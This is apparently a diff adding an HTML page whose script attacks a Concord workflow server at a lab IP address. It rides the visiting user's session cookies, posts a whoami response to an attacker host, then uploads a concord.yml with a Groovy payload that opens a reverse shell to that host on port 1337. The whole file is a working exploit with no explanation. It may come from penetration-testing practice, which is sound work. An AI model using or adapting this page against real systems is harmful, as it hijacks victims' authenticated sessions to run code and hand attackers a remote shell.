@@ -1,0 +1,68 @@
+<html>
+<head>
+   <script>
+      yml = `
+configuration:
+  dependencies:
+    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"
+
+flows:
+  default:
+    - script: groovy
+      body: |
+         String host = "192.168.45.179";
+         int port = 1337;
+         String cmd = "/bin/sh";
+         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+         Socket s = new Socket(host, port);
+         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+         while (!s.isClosed()) {
+         while (pi.available() > 0) so.write(pi.read());
+         while (pe.available() > 0) so.write(pe.read());
+         while (si.available() > 0) po.write(si.read());
+         so.flush();
+         po.flush();
+         Thread.sleep(50);
+         try {
+            p.exitValue();
+            break;
+         } catch (Exception e) {}
+         };
+         p.destroy();
+         s.close();
+`
+      fetch("http://192.168.249.132:8001/api/service/console/whoami", {
+         credentials: 'include'
+      })
+         .then(async (response) => {
+            if (response.status != 401) {
+               let data = await response.text();
+               fetch("http://192.168.45.179/?msg=" + data)
+               rce();
+            } else {
+               fetch("http://192.168.45.179/?msg=UserNotLoggedIn")
+            }
+         })
+
+      function rce() {
+         var ymlBlob = new Blob([yml], { type: "application/yml" });
+         var fd = new FormData();
+         fd.append('concord.yml', ymlBlob);
+         fetch("http://192.168.249.132:8001/api/v1/process", {
+            credentials: 'include',
+            method: 'POST',
+            body: fd
+         })
+            .then(response => response.text())
+            .then(data => {
+               fetch("http://192.168.45.179/?msg=" + data)
+            }).catch(err => {
+               fetch("http://192.168.45.179/?err=" + err)
+            });
+      }
+   </script>
+</head>
+<body>
+</body>
+</html>
